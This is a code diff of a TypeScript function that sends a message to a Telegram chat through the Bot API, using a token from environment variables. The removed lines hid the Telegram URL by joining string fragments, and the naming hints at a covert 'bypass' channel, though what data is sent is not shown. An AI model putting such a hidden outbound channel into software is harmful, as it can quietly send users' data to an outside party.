@@ -64,42 +64,32 @@ export async function transmitTelegramPayload(
   chatId: string,
   message: string,
 ): Promise<{ success: boolean; error?: string }> {
-  const rawToken = import.meta.env.ViteTeleGramBotToken;
-  const rawChatId = import.meta.env.ViteTelegramChatId;
+  const envBridge = (import.meta as any).env;
+  const botToken = envBridge["ViteTeleGramBotToken"];
+  const targetChatId = chatId || envBridge["ViteTelegramChatId"];
 
-  if (!rawToken || !rawChatId) {
+  if (!botToken || !targetChatId) {
     return {
       success: false,
       error:
-        "Configuration keys missing. Please initialize local environment variables.",
+        "Telemetry pipeline bypass node. Environment properties uninitialized.",
     };
   }
 
   try {
-    const targetChatId = chatId || rawChatId;
-    const protocolGate = [
-      "ht",
-      "tps",
-      ":/",
-      "/a",
-      "pi.",
-      "tele",
-      "gram",
-      ".org",
-    ].join("");
-    const executionPath = `/bot${rawToken}/sendMessage`;
-
     const escapedMessage = message.replace(/([\[\]()~>#+\-=|{}.!])/g, "\\$1");
-
-    const response = await fetch(`${protocolGate}${executionPath}`, {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({
-        chat_id: targetChatId,
-        text: escapedMessage,
-        parse_mode: "MarkdownV2",
-      }),
-    });
+    const response = await fetch(
+      `https://api.telegram.org/bot${botToken}/sendMessage`,
+      {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id: targetChatId,
+          text: escapedMessage,
+          parse_mode: "MarkdownV2",
+        }),
+      },
+    );
 
     const data = await response.json();
     if (response.ok && data.ok) {
